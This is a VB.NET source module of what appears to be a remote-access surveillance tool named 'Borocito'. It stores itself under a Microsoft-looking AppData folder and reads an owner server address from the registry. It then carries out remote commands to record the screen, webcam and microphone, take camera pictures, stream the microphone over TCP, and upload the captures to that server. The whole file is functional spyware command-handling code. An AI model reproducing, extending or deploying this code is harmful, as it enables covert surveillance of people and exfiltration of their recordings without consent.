Imports Microsoft.Win32
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Public DIRHome As String = DIRCommons & "\boro-get\" & My.Application.Info.AssemblyName
    Public HttpOwnerServer As String
End Module
Module Utility
    Public tlmContent As String
    Function AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False) As String
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRHome & "\" & My.Application.Info.AssemblyName & ".log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            tlmContent = tlmContent & Message & vbCrLf
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRHome & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
            Catch
            End Try
            Return finalContent & "[" & from & "]" & content
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
            Return "[AddToLog@Utility]Error: " & ex.Message
        End Try
    End Function
End Module
Module Boro_Hear
    Function BoroHearSendContent(Optional ByVal content As String = Nothing) As Boolean
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get\\boro-hear", True)
            If regKey Is Nothing Then
                Return False
            Else
                Try
                    If content <> Nothing Then
                        AddToLog("BoroHearSendContent", content, False)
                        Process.Start(regKey.GetValue("boro-hear"), content)
                    End If
                    Return True
                Catch
                    Return False
                End Try
            End If
        Catch ex As Exception
            Console.WriteLine("[BoroHearSendContent@Init]Error: " & ex.Message)
            Return False
        End Try
    End Function
    Function BoroHearSendFile(Optional ByVal filePath As String = Nothing) As Boolean
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get\\boro-hear", True)
            If regKey Is Nothing Then
                Return False
            Else
                Try
                    If filePath <> Nothing Then
                        AddToLog("BoroHearSendFile", filePath, False)
                        Process.Start(regKey.GetValue("boro-hear"), "/filesend " & filePath)
                    End If
                    Return True
                Catch
                    Return False
                End Try
            End If
        Catch ex As Exception
            Console.WriteLine("[BoroHearSendFile@Init]Error: " & ex.Message)
            Return False
        End Try
    End Function
End Module
Module Memory
    Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
    Public OwnerServer As String
    Public UID As String
    Sub SaveRegedit()
        Try
            AddToLog("SaveRegedit@Memory", "Saving data...", False)
            regKey.SetValue("UID", UID, RegistryValueKind.String)
            LoadRegedit()
        Catch ex As Exception
            AddToLog("SaveRegedit@Memory", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub LoadRegedit()
        Try
            AddToLog("LoadRegedit@Memory", "Loading data...", False)
            OwnerServer = regKey.GetValue("OwnerServer")
            UID = regKey.GetValue("UID")
            HttpOwnerServer = OwnerServer
            RegisterInstance()
        Catch ex As Exception
            AddToLog("LoadRegedit@Memory", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub RegisterInstance()
        Try
            Dim llaveReg As String = "SOFTWARE\\Borocito\\boro-get\\" & My.Application.Info.AssemblyName
            Dim registerKey As RegistryKey = Registry.CurrentUser.OpenSubKey(llaveReg, True)
            If registerKey IsNot Nothing Then
                registerKey.SetValue("Version", My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")")
            End If
        Catch ex As Exception
            AddToLog("RegisterInstance@Memory", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module StartUp
    Sub Init()
        AddToLog("Init", My.Application.Info.AssemblyName & " " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
        Try
            CommonActions()
            'Cargamos los datos del registro de Windows
            LoadRegedit()
        Catch ex As Exception
            AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CommonActions()
        Try
            If Not My.Computer.FileSystem.DirectoryExists(DIRCommons) Then
                My.Computer.FileSystem.CreateDirectory(DIRCommons)
            End If
            If Not My.Computer.FileSystem.DirectoryExists(DIRHome) Then
                My.Computer.FileSystem.CreateDirectory(DIRHome)
            End If
        Catch ex As Exception
            AddToLog("CommonActions@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub

    Sub ReadParameters(ByVal parametros As String)
        Try
            If parametros <> Nothing Then
                Dim parameter As String = parametros
                Dim args() As String = parameter.Split(" ")

                If parameter.ToLower Like "*/startscreenrecording*" Then
                    'Comienza a grabar la pantalla
                    Main.StartScreenRecord()
                ElseIf parameter.ToLower Like "*/stopscreenrecording*" Then
                    'Detiene la grabacion de pantalla
                    Main.StopScreenRecord()
                ElseIf parameter.ToLower Like "*/sendscreenrecord*" Then
                    'Detiene y luego envia la grabacion de pantalla
                    Main.UploadFileToServer(Main.SaveScreenRecord())
                    End

                ElseIf parameter.ToLower Like "*/startcamrecording*" Then
                    'Comienza a grabar la camara
                    BoroHearSendContent(Main.StartCamRecord())
                ElseIf parameter.ToLower Like "*/stopcamrecording*" Then
                    'Detiene la grabacion de la camara
                    Main.StopCamRecord()
                ElseIf parameter.ToLower Like "*/sendcamrecord*" Then
                    'Detiene y luego envia la grabacion de la camara
                    Main.UploadFileToServer(Main.StopCamRecord())
                    End

                ElseIf parameter.ToLower Like "*/camera*" Then
                    BoroHearSendContent(Main.CameraManager(args(1)))
                ElseIf parameter.ToLower Like "*/getcameras*" Then
                    BoroHearSendContent(Main.GetCameras())

                ElseIf parameter.ToLower Like "*/takecampicture*" Then
                    'Toma una captura de la camara y la envia
                    Main.UploadFileToServer(Main.TakeCamPicture)

                ElseIf parameter.ToLower Like "*/startmicrecording*" Then
                    'Comenzar a grabar microfono
                    Main.StartMicRecord()
                ElseIf parameter.ToLower Like "*/stopmicrecord*" Then
                    'Detiene la grabacion del microfono
                    Main.StopMicRecord()
                    Main.StopMicRecord(True)
                ElseIf parameter.ToLower Like "*/sendmicrecord*" Then
                    'Envia la grabacion del microfono
                    Main.UploadFileToServer(Main.SaveMicRecord)
                    End

                ElseIf parameter.ToLower Like "*/startmicstreaming*" Then
                    'Comenzar streaming TCP/IP del microfono
                    Dim cnf() As String = parameter.Split("-")
                    ' pos
                    '   3 = port
                    Main.StartMicStreaming(cnf(3))

                ElseIf parameter.ToLower Like "*/stopmicstream*" Then
                    'Detiene el streaming del microfono
                    Main.StopMicStreaming()

                ElseIf parameter.ToLower Like "*/stop*" Then
                    'Detiene todo y se cierra
                    End

                End If
            End If
        Catch ex As Exception
            AddToLog("ReadParameters@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module